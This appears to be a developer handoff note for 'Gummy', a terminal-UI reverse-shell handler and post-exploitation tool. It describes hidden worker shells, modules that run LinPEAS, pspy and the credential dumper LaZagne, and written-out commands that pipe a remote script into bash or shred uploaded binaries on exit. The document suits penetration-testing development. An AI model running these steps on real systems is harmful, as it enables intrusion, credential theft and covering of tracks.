# TUI Current Status — 2026-04-03

## What's Done

### Core TUI
- Bubble Tea TUI with 3-tier responsive layout (Full/Medium/Compact)
- F11 sidebar toggle, F12 attach/detach toggle
- Per-session output buffers and command history
- Shell relay with PTY upgrade, SIGWINCH resize
- Mouse text selection, clipboard, scrollbar, notification bar, spinner
- Quit confirmation, ANSI-aware rendering
- Persistent menu history, session auto-select
- Exit banner with session log path
- Compact attach/detach messages (dedicated icons)

### Transfers
- Async fire-and-forget via `transferDoneFunc` callback
- Status bar progress overlay (hatching `/` for uploads, size counter for downloads)
- SmartUpload (HTTP binbag → b64 fallback), SmartDownload (HTTP POST → b64 fallback)
- Stop/restart relay + stty -echo + 1KB chunks for PTY shells
- Tilde expansion, Ctrl+C cancel, Enter/F12 blocked during transfer

### Bang Mode (`!` prefix in shell)
- `!upload`, `!download`, `!spawn`, `!kill`, `!run` from shell context
- Tab completion, menu history, contextual placeholder

### Spawn
- Async with TUI spinner, payload echo suppressed via dual-mode relay suppression

### Binbag + Pivot + Config
- `binbag ls/on/off/path/port`, auto-persist, upload path fallback CWD → binbag
- `pivot <ip>` / `pivot off` — IP-only, affects all URLs/payloads
- Tab completion merges CWD + binbag files

### Module System

**Architecture (Penelope-inspired worker session model):**

The module system spawns an invisible "worker session" to execute modules. This keeps the main session 100% free for shell interaction, uploads, spawns, etc.

**Flow:**
1. `run <module>` → spinner "Spawning worker shell for <module>..."
2. Gummy sends spawn payload from main session (suppressed from viewport)
3. `pendingWorker` atomic flag marks the next `AddSession` as a worker
4. Worker session connects — completely invisible:
   - Not shown in list/sidebar/session count
   - No "reverse shell received" notification
   - No detection spinner, stdout/stderr suppressed during detection
   - No "session closed" notification when removed
5. Module executes on worker (BLOCKING):
   - `RunScriptInMemory`: HTTP binbag (`curl -s URL | bash -s -- args`) or b64 fallback
   - `RunBinary`: SmartUpload → `chmod +x` → execute, with `trap EXIT` for cleanup (shred)
   - `ExecuteWithStreamingCtx` captures output to local file
   - Terminal window opens with `tail -f` of local output file
   - Done marker (`__GUMMY_DONE_*__`) filtered from output file
6. Spinner stops immediately after setup — notification in viewport
7. When module finishes, worker session is closed and removed (cleanup via trap for binaries)

**Key files:**
- `session.go:StartModule()` — orchestrates spawn → wait → run → cleanup worker
- `session.go:RunScriptInMemory()` — resolves source, builds command, calls ExecuteWithStreamingCtx (BLOCKING)
- `session.go:RunBinary()` — upload → chmod → execute → trap EXIT shred (BLOCKING)
- `session.go:AddSession()` — checks `pendingWorker` flag, suppresses notifications for workers
- `session.go:RemoveSession()` — suppresses disconnect notifications for workers
- `shell.go:ExecuteWithStreamingCtx()` — reads conn, writes to file, filters markers
- `modules.go` — module registry and implementations

**Tested Linux modules:**
- [x] `peas` — LinPEAS (RunScriptInMemory, HTTP binbag) ✅
- [x] `lse` — Linux Smart Enumeration (RunScriptInMemory, args with `--`) ✅
- [x] `loot` — ezpz post-exploitation (RunScriptInMemory) ✅
- [x] `linexp` — Linux Exploit Suggester (RunScriptInMemory) ✅
- [x] `pspy` — process monitor (RunBinary, disk+cleanup, 5min timeout) ✅
  - trap EXIT cleanup confirmed working
  - Worker auto-closes after timeout

**Untested Linux modules:**
- [ ] `sh <url>` — arbitrary bash script (RunScriptInMemory)
- [ ] `bin <url|file>` — arbitrary binary (RunBinary)
- [ ] `py <url>` — arbitrary Python script (RunPythonInMemory — needs refactoring)

**Untested Windows modules (need refactoring first):**
- [ ] `winpeas` — WinPEAS (.NET in-memory, RunDotNetInMemory)
- [ ] `seatbelt` — Seatbelt (.NET in-memory, RunDotNetInMemory)
- [ ] `lazagne` — LaZagne (binary, RunBinary)
- [ ] `ps1 <url>` — arbitrary PowerShell script (RunPowerShellInMemory)
- [ ] `dotnet <url>` — arbitrary .NET assembly (RunDotNetInMemory)

**Windows Run* methods still need refactoring:**
- `RunPowerShellInMemory` — launches internal goroutines, not blocking
- `RunDotNetInMemory` — launches internal goroutines, not blocking
- `RunPythonInMemory` — launches internal goroutines, not blocking
- All three need the same treatment as RunBinary: remove goroutines, use ExecuteWithStreamingCtx, be BLOCKING

## Dead Code Warning

After refactoring RunBinary, there is dead code to clean up:
1. `ExecuteWithStreaming` (non-Ctx version) — used only by the unrefactored Windows Run* methods
2. `ExecuteScriptFromStdin` — never called from anywhere
3. `moduleCancel` field on SessionInfo — was for old model, may be stale
4. `WatchForCancel` — was for CLI mode cancel, check if still used in TUI context

## Architecture Decisions

### Why Worker Sessions (Penelope Model)
- Single TCP connection cannot be shared between module output streaming and shell interaction
- Penelope solves this with "control sessions" — separate connections for command execution
- Gummy spawns a reverse shell from the main session, uses it exclusively for the module
- Main session stays 100% free — shell, spawn, upload, download all work normally

### Why BLOCKING Run* Methods
- Previously launched internal goroutines — caller couldn't know when module finished
- Now the caller (StartModule goroutine) blocks until ExecuteWithStreamingCtx returns
- Clean lifecycle: spawn → detect → run (blocking) → cleanup worker

### Why trap EXIT for RunBinary
- Binaries like pspy run indefinitely — cleanup (shred) can't just be chained with `;`
- `trap 'shred -uz ...' EXIT` fires on any shell exit: natural, SIGHUP (conn close), timeout
- Worker conn close triggers SIGHUP → trap fires → binary cleaned up

### Why Timeout on pspy (not RunBinary)
- RunBinary is generic — most binaries finish on their own
- pspy specifically runs indefinitely — the 5min timeout is on the PSPYModule, not RunBinary
- Each module controls its own timeout via context

### Why No Spinner/Notification During Execution
- Spinner blocks Enter key (by design — prevents concurrent operations)
- Module execution takes minutes — blocking input defeats the purpose of worker sessions
- Instead: spinner during setup only, then viewport notification "output sent to new terminal window"
- No "completed"/"started" overlay — user sees output in the terminal window

## What's Next

### Immediate: Complete Linux Module Testing
1. Test `run loot` (same pattern as peas/lse)
2. Test `run linexp` (same pattern)
3. Test `run sh <url>` (custom script)
4. Test `run bin <url|file>` (custom binary, ELF)

### Then: Dead Code Cleanup
1. Remove `ExecuteScriptFromStdin` (never called)
2. Check `moduleCancel` field — remove if unused
3. `ExecuteWithStreaming` (non-Ctx) — keep until Windows Run* methods are refactored

### Then: Windows Run* Refactoring
1. Refactor `RunPowerShellInMemory` — remove goroutines, use ExecuteWithStreamingCtx
2. Refactor `RunDotNetInMemory` — same
3. Refactor `RunPythonInMemory` — same
4. Then `ExecuteWithStreaming` (non-Ctx) can be removed

### Then: Other Priorities
1. Per-command help (TUI modal)
2. Windows testing
3. Upload/download test matrix

## Important Notes for Handoff

- **Build the binary**: always `go build -o gummy .` before testing
- **UI consistency**: always use `ui/colors.go` helpers, never raw styles
- **p.Send deadlock**: ALL callbacks MUST use `go p.Send(...)`
- **PTY transfers**: stop relay + stty -echo + 1KB chunks when relay was active
- **Worker sessions**: invisible, use `pendingWorker` atomic flag, suppress all notifications
- **Worker cleanup**: StartModule closes worker conn + RemoveSession after module.Run returns
- **Module args**: use `-- args` separator (not just `args`) to avoid bash option conflicts
- **Module output**: ExecuteWithStreamingCtx filters done markers from local file
- **Binary cleanup**: RunBinary uses `trap EXIT` for shred — fires on conn close
- **Two-computer workflow**: handoff context must be in docs/

## File Map

```
internal/
├── session.go      # Manager, commands, StartModule, RunScriptInMemory, RunBinary, worker sessions
├── shell.go        # Handler, ExecuteWithStreaming/Ctx, PTY modes
├── modules.go      # Module registry: peas, lse, loot, linexp, pspy, winpeas, seatbelt, lazagne, bin, sh, ps1, dotnet, py
├── transfer.go     # SmartUpload/SmartDownload, HTTP + b64
├── fileserver.go   # HTTP server (GET=serve, POST=receive)
├── config.go       # TOML config
├── runtime_config.go # Auto-persist, pivot, binbag management
├── payloads.go     # Reverse shell generators (used by spawn + module worker)
├── listener.go     # TCP listener
├── pty.go          # PTY upgrade
├── ssh.go          # SSH + auto revshell
├── netutil.go      # Network utilities
├── downloader.go   # HTTP file downloader
├── terminal.go     # Terminal window opener
└── ui/colors.go    # UI helpers, symbols, color functions

internal/tui/
├── app.go          # Root model, relay, buffers, bang mode, transfers, spawn, modules, kill
├── input.go        # Text input, bang mode, persistent history
├── outputpane.go   # Viewport, spinner
├── statusbar.go    # Hints, notifications, progress bar
├── layout.go       # 3-tier layout + F11 toggle
├── messages.go     # All tea.Msg types
├── styles.go       # Colors
├── logo.go         # Banner + exit banner
├── header.go       # Compact header
├── selection.go    # Mouse selection
├── clipboard.go    # OSC 52 + native
├── focus.go        # FocusMode
└── dialog.go       # Modal dialogs
```

## Branch: `tui` (based on `main`)
